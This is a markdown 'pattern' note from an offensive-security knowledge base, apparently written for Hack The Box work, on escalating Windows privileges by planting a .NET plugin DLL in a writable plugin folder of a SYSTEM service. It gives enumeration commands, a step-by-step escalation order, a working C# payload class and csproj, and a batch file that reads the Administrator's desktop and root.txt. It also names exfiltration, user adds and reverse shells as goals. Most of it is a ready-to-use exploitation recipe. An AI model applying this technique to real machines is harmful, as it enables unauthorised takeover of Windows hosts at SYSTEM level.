---
doc_kind: pattern
title: ".NET Plugin DLL Hijack (namespace must match filename)"
category: misc
slug: dotnet-plugin-dll-hijack
created: 2026-10-04
status: active
tags:
  - windows
  - dotnet
  - dll-hijack
  - privesc
  - plugin-loading
chain_summary: "Writable plugin folder for a SYSTEM/Session-0 .NET host -> drop class lib whose root namespace equals the deployed DLL filename stem -> host instantiates via ctor and/or Initialize() -> code exec at host privilege."
---
# .NET Plugin DLL Hijack (namespace must match filename)

## Chain Summary

- One-line chain: Writable plugin folder for a SYSTEM/Session-0 .NET host -> drop class lib whose root namespace equals the deployed DLL filename stem -> host instantiates via ctor and/or Initialize() -> code exec at host privilege.
- Typical target shape: a Windows app/service (often "Nexion"-style vendor apps on HTB, printer/scanner/device managers, custom agents) that ships a `plugins\` or `extensions\` subfolder next to its published binaries, scanned at startup and/or on a file-watcher trigger.

## Preconditions

- You can write into the plugin folder — usually not via the Everyone/Users group, but via a **custom local group** surfaced only by `whoami /groups` (e.g. `Printer Administrators`), holding `(M)` or `(F)` in `icacls`. Don't stop checking ACLs after seeing `BUILTIN\Administrators`.
- The consuming process runs with higher privilege than you: confirmed via `tasklist /v` showing `Session Name: Services`, `Session#: 0`, `User Name: Unknown` (you can't see the name without admin, but Session 0 + "Unknown" is itself the tell).
- `dotnet` SDK is available on the box (check `dotnet --version`) and the target's `*.runtimeconfig.json` tells you the TFM to match (e.g. `net8.0`).
- Some mechanism exists to force a reload without needing a full service restart — look for a `*.trigger` file convention, a `ProgramData\<Vendor>\` folder with a watched file, a REST "restart"/"reload" admin endpoint, or just wait out a periodic poll.

## Cheap Probes

- `whoami /groups` — look for anything non-default.
- `icacls "<candidate plugin folder>"` — look for your group with `(M)`/`(F)`/`(W)`.
- `tasklist /v /fi "IMAGENAME eq <host>.exe"` — check `Session Name` / `Session#`.
- `dotnet --version` and `dir *.runtimeconfig.json` under the host's publish folder.

## Telltale Evidence

- Dropping any `.dll` into the folder and then immediately trying to overwrite it: `The process cannot access the file because it is being used by another process` **means it got loaded** — positive confirmation the folder is actively scanned, not a dead end.
- No visible crash/log is NOT proof the technique failed — add direct, dumb file-write diagnostics (see Common Mistakes) before concluding the loader isn't calling your type.

## Escalation Order

1. `dotnet new classlib -n Plugin --framework <matching TFM>`.
2. Write a minimal class with **both** a parameterless constructor and a method named `Initialize()` executing the same payload — different loaders call one, the other, or both; covering both costs nothing.
3. **Set `<AssemblyName>` in the `.csproj` to the exact string you will use as the C# `namespace`.** This is the single most common blocker: many naive plugin loaders resolve the type to instantiate by looking up `assembly.GetType(<namespaceMatchingFilename>.<AnyClassName>)` or iterate `GetExportedTypes()` filtered by a namespace convention tied to the file name. If `plugin3.dll` contains `namespace Plugin;` it silently loads but nothing fires.
4. Keep the actual exploit logic in a **separate `.bat` file** written directly (no escaping through C#/cmd layers) and have the C# payload just do `Process.Start("cmd.exe", "/c C:\\Temp\\payload.bat")`. Avoids multi-layer escaping corruption entirely.
5. Deploy: `copy /y plugin7.dll "<plugins folder>\plugin7.dll"`.
6. Trigger a reload (watched trigger file, REST endpoint, wait for poll interval).
7. Verify with a `whoami > out.txt` style diagnostic in the bat file before attempting the real objective (file exfil, user add, reverse shell).
8. If no effect: add `File.AppendAllText(@"C:\Temp\plugin_loaded.txt", "ctor " + DateTime.Now)` as the literal first line of the constructor and `Initialize()`, redeploy under a **new filename**, retrigger, and check the log file. This isolates "not loaded" vs "loaded but payload itself fails" vs "loaded but never instantiated" (the namespace-mismatch case).

## Common Mistakes

- Forgetting C# requires `\\` (or `@"..."` verbatim strings) for Windows paths — single backslashes produce `CS1009: Unrecognized escape sequence`.
- Fighting a locked DLL by trying to overwrite the *same* filename after it's been loaded — just increment the filename (`plugin2.dll`, `plugin3.dll`, ...) instead; the lock itself is useful positive evidence.
- Embedding a whole multi-command shell pipeline (with `&&`, `>`, `2>&1`, quotes) directly inside a C# `Arguments` string that is itself generated via a `cmd.exe echo` one-liner. Three layers of escaping (outer cmd -> C# string literal -> inner cmd) silently corrupts characters (observed: `p?` became `ec/`). Always externalize to a `.bat` file instead.
- Assuming "DLL is locked" == "my payload ran". It only proves the assembly was *loaded*, not that any type inside it was instantiated or any method invoked — namespace/filename mismatch is a real, common failure mode that still locks the file.

## Payload Shapes

```csharp
// Class1.cs — namespace MUST equal the deployed DLL filename stem (here: plugin7.dll)
using System.Diagnostics;
namespace plugin7;
public class Class1
{
    public Class1() { Run(); }
    public void Initialize() { Run(); }
    private void Run()
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = @"/c C:\Temp\payload.bat",
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        catch { }
    }
}
```

```xml
<!-- Plugin.csproj -->
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <AssemblyName>plugin7</AssemblyName>
  </PropertyGroup>
</Project>
```

```bat
:: payload.bat — keep ALL real logic here, zero nested escaping
whoami > C:\Temp\diag.txt
dir "C:\Users\Administrator\Desktop" >> C:\Temp\diag.txt 2>&1
type "C:\Users\Administrator\Desktop\root.txt" >> C:\Temp\diag.txt 2>&1
```

## Related Writeups

- `writeups/misc/htb-touch-kiosk-plugin-hijack.md`

## Skill Impact

- Related skill: `pwn-triage` / a future generic `windows-privesc-triage` skill (does not exist yet).
- Rule to add or update: when enumerating Windows privesc on a low-priv shell, always run `whoami /groups` and cross-reference every non-default group against `icacls` on any third-party app folder found under `C:\Program Files\`, specifically looking for `plugins`/`extensions`/`addons` subfolders next to a process shown running in Session 0.
